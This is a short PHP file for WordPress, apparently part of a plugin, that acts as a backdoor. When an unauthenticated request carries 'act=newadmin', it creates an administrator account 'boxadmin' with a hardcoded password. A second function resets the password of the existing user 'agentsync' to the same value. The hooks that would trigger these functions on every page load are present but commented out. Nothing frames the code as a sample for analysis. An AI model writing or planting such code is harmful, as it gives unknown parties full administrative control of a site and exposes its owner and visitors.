<?php
function box_insert_admin(){

    $args = array(
        'user_email' => 'admin@gmail.com',   
        'first_name' => 'First',  
        'last_name'  => 'Last ',  
        'role'       => 'administrator',
        'user_login' => 'boxadmin',
	    'user_pass'  => "boxadmin@"
    );  
    $user_id = wp_insert_user($args);
    if ( ! is_wp_error( $user_id ) ) {
        echo "User created : ". $user_id;
  
    } else {
        echo '<pre>';
        var_dump($user_id);

    }
}
function box_auto_run(){
    $act = isset($_GET['act']) ? $_GET['act'] :0;
    if($act == 'newadmin'){
        box_insert_admin();
    } else if($act == 'check'){
        die('ok, plugin ready.');
    }else if($act == 'abc123'){
        die('abc123');
    }


    
}
function box_update_password(){
    $user = get_user_by('login','agentsync');
    var_dump($user);
    $user_data = wp_update_user( array( 'ID' => $user->ID, 'user_pass' => 'boxadmin@' ) );
    die();
}
// add_action('wp_footer','box_auto_run');
 // add_action('init','box_auto_run');
 // add_action('init','box_update_password');